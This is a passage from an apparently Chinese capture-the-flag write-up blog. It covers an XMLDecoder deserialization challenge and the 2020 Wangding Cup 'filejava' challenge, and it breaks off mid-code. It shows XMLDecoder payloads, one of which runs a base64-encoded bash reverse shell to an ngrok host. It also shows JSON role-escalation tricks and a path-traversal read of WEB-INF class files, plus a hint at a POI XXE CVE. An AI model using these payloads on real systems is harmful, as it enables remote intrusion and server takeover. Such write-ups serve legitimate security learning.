<span class="variable">preparedStatement</span> <span class="operator">=</span> connection.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; params.length; ++i) &#123;</span><br><span class="line">            preparedStatement.setObject(i + <span class="number">1</span>, params[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> preparedStatement.executeQuery();</span><br><span class="line">        <span class="keyword">return</span> rs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">Update</span><span class="params">(Connection connection, String sql, Object[] params)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">PreparedStatement</span> <span class="variable">preparedStatement</span> <span class="operator">=</span> connection.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> updateRows;</span><br><span class="line">        <span class="keyword">for</span>(updateRows = <span class="number">0</span>; updateRows &lt; params.length; ++updateRows) &#123;</span><br><span class="line">            preparedStatement.setObject(updateRows + <span class="number">1</span>, params[updateRows]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        updateRows = preparedStatement.executeUpdate();</span><br><span class="line">        <span class="keyword">return</span> updateRows;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">closeResource</span><span class="params">(Connection connection, ResultSet result, PreparedStatement preparedStatement)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                result.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">                var6.printStackTrace();</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            result = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (preparedStatement != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                preparedStatement.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException var5) &#123;</span><br><span class="line">                var5.printStackTrace();</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            preparedStatement = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            getConfig();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var1) &#123;</span><br><span class="line">            var1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>存在xmldecoder漏洞</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.7.0_80&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>板了一些命令,使用实体编码来绕过</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.<span class="symbol">&amp;#80;</span>rocessBuilder&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5qcC5uZ3Jvay5pby8xNTQzMiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=&#123; username: &#x27;12&#x27;, password: &#x27;test&#x27;, role: &#x27;admin&#x27; ,&#x27;1&#x27;:&#123;&quot;role&quot;:&quot;role&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>写两个role来绕过</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425185700176.png" alt="image-20220425185700176"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425185708862.png" alt="image-20220425185708862"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=&#123; username: &#x27;1234&#x27;, password: &#x27;test&#x27;, role: &#x27;admin&#x27; /*,&quot;role&quot;:&quot;role&quot;*/&#125;</span><br></pre></td></tr></table></figure>

<p>注释绕过</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425185938772.png" alt="image-20220425185938772"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425190320453.png" alt="image-20220425190320453"></p>
<p>接着再次登录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425191721078.png" alt="image-20220425191721078"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425191727758.png" alt="image-20220425191727758"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425192011785.png" alt="image-20220425192011785"></p>
<p>非预期</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (checkExt(ext) || checkContent(item.getInputStream())) &#123;</span><br><span class="line">                        req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;upload failed&quot;</span>);</span><br><span class="line">                        req.getRequestDispatcher(<span class="string">&quot;../WEB-INF/upload.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>

<p>在if里面这里如果后缀和内容出现了问题之后,并没有return,也就是说在执行完if里面的两句话之后程序还会继续向下执行下去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无论是request.getRequestDispatcher(path).forward(request,response)还是response.sendRedirect,程序都会在执行完该句的情况下继续向下执行,因此在必要的情况下应该使用return终止该方法</span><br></pre></td></tr></table></figure>

<p>但是upload目录不可写,写到static目录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425212653948.png" alt="image-20220425212653948"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425212821829.png" alt="image-20220425212821829"></p>
<h1 id="网鼎杯-2020-青龙组-filejava"><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425210721675.png" alt="image-20220425210721675"></p>
<p>一个上传点</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425213349544.png" alt="image-20220425213349544"></p>
<p>没地址,但是能下载,试试下载web.xml</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425213607495.png" alt="image-20220425213607495"></p>
<p>可行</p>
<p>web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;DownloadServlet.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DownloadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="comment">//定义一个常量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DownloadServlet</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//get调用post</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">//得文件名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;filename&quot;</span>);</span><br><span class="line">        fileName = <span class="keyword">new</span> <span class="title class_">String</span>(fileName.getBytes(<span class="string">&quot;ISO8859-1&quot;</span>), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;filename=&quot;</span> + fileName);</span><br><span class="line">        <span class="comment">//如果文件名等于flag就禁止读取</span></span><br><span class="line">        <span class="keyword">if</span> (fileName != <span class="literal">null</span> &amp;&amp; fileName.toLowerCase().contains(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">            request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;禁止读取&quot;</span>);</span><br><span class="line">            <span class="comment">//转发请求到message.jsp</span></span><br><span class="line">            request.getRequestDispatcher(<span class="string">&quot;/message.jsp&quot;</span>).forward(request, response);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//获取保存绝对路径</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">fileSaveRootPath</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/upload&quot;</span>);</span><br><span class="line">            <span class="comment">//去找有没有这个文件</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="built_in">this</span>.findFileSavePathByFileName(fileName, fileSaveRootPath);</span><br><span class="line">            <span class="comment">//接着就保存</span></span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path + <span class="string">&quot;/&quot;</span> + fileName);</span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;您要下载的资源已被删除!&quot;</span>);</span><br><span class="line">                request.getRequestDispatcher(<span class="string">&quot;/message.jsp&quot;</span>).forward(request, response);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">realname</span> <span class="operator">=</span> fileName.substring(fileName.indexOf(<span class="string">&quot;_&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">                response.setHeader(<span class="string">&quot;content-disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(realname, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path + <span class="string">&quot;/&quot;</span> + fileName);</span><br><span class="line">                <span class="type">ServletOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">                <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">var11</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> len;</span><br><span class="line">                <span class="keyword">while</span>((len = in.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                in.close();</span><br><span class="line">                out.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">findFileSavePathByFileName</span><span class="params">(String filename, String saveRootPath)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> filename.hashCode();</span><br><span class="line">        <span class="type">int</span> <span class="variable">dir1</span> <span class="operator">=</span> hashCode &amp; <span class="number">15</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">dir2</span> <span class="operator">=</span> (hashCode &amp; <span class="number">240</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dir</span> <span class="operator">=</span> saveRootPath + <span class="string">&quot;/&quot;</span> + dir1 + <span class="string">&quot;/&quot;</span> + dir2;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            file.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dir;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ListFileServlet.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListFileServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ListFileServlet</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uploadFilePath</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/upload&quot;</span>);</span><br><span class="line">        Map&lt;String, String&gt; fileNameMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">saveFilename</span> <span class="operator">=</span> (String)request.getAttribute(<span class="string">&quot;saveFilename&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> (String)request.getAttribute(<span class="string">&quot;filename&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;saveFilename&quot;</span> + saveFilename);</span><br><span class="line">        System.out.println(<span class="string">&quot;filename&quot;</span> + filename);</span><br><span class="line">        saveFilename.substring(saveFilename.indexOf(<span class="string">&quot;_&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        fileNameMap.put(saveFilename, filename);</span><br><span class="line">        request.setAttribute(<span class="string">&quot;fileNameMap&quot;</span>, fileNameMap);</span><br><span class="line">        request.getRequestDispatcher(<span class="string">&quot;/listfile.jsp&quot;</span>).forward(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>UploadServlet.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UploadServlet</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">savePath</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/upload&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">tempPath</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/temp&quot;</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">tempFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(tempPath);</span><br><span class="line">        <span class="keyword">if</span> (!tempFile.exists()) &#123;</span><br><span class="line">            tempFile.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">DiskFileItemFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DiskFileItemFactory</span>();</span><br><span class="line">            factory.setSizeThreshold(<span class="number">102400</span>);</span><br><span class="line">            factory.setRepository(tempFile);</span><br><span class="line">            <span class="type">ServletFileUpload</span> <span class="variable">upload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletFileUpload</span>(factory);</span><br><span class="line">            upload.setHeaderEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            upload.setFileSizeMax(<span class="number">1048576L</span>);</span><br><span class="line">            upload.setSizeMax(<span class="number">10485760L</span>);</span><br><span class="line">            <span class="keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            List&lt;FileItem&gt; list = upload.parseRequest(request);</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">var10</span> <span class="operator">=</span> list.iterator();</span><br><span class="line"></span><br><span class="line">            label56:</span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!var10.hasNext()) &#123;</span><br><span class="line">                        <span class="keyword">break</span> label56;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">FileItem</span> <span class="variable">fileItem</span> <span class="operator">=</span> (FileItem)var10.next();</span><br><span class="line">                    String filename;</span><br><span class="line">                    String fileExtName;</span><br><span class="line">                    <span class="keyword">if</span> (fileItem.isFormField()) &#123;</span><br><span class="line">                        filename = fileItem.getFieldName();</span><br><span class="line">                        fileExtName = fileItem.getString(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        filename = fileItem.getName();</span><br><span class="line">                        <span class="keyword">if</span> (filename != <span class="literal">null</span> &amp;&amp; !filename.trim().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                            fileExtName = filename.substring(filename.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">                            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> fileItem.getInputStream();</span><br><span class="line">                            <span class="comment">//这里是一个excel和xxe漏洞的结合，CVE-2014-3529</span></span><br><span class="line">                            <span class="keyword">if</span> (filename.startsWith(<span class="string">&quot;excel-&quot;</span>) &amp;&amp; <span class="string">&quot;xlsx&quot;</span>.equals(fileExtName)) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    <span class="type">Workbook</span> <span class="variable">wb1</span> <span class="operator">=</span> WorkbookFactory.create(in);</span><br><span class="line">                                    <span class="type">Sheet</span> <span class="variable">sheet</span> <span class="operator">=</span> wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">                                    System.out.println(sheet.getFirstRowNum());</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (InvalidFormatException var20) &#123;</span><br><span class="line">                                    System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">                                    var20.printStackTrace();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="type">String</span> <span class="variable">saveFilename</span> <span class="operator">=</span> <span class="built_in">this</span>.makeFileName(filename);</span><br><span class="line">                            request.setAttribute(<span class="string">&quot;saveFilename&quot;</span>, saveFilename);</span><br><span class="line">                            request.setAttribute(<span class="string">&quot;filename&quot;</span>, filename);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">realSavePath</span> <span class="operator">=</span> <span class="built_in">this</span>.makePath(saveFilename, savePath);</span><br><span class="line">                            <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(realSavePath + <span class="string">&quot;/&quot;</span> + saveFilename);</span><br><span class="line">                            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                            <span class="type">boolean</span> <span class="variable">var19</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">                            <span class="type">int</span> len;</span><br><span class="line">                            <span class="keyword">while</span>((len = in.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            in.close();</span><br><span class="line">                            out.close();</span><br><span class="line">                            message = <span class="string">&quot;文件上传成功!&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileUploadException var21) &#123;</span><br><span class="line">            var21.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        request.setAttribute(<span class="string">&quot;message&quot;</span>, message);</span><br><span class="line">        request.getRequestDispatcher(<span class="string">&quot;/ListFileServlet&quot;</span>).forward(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">makeFileName</span><span class="params">(String filename)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> 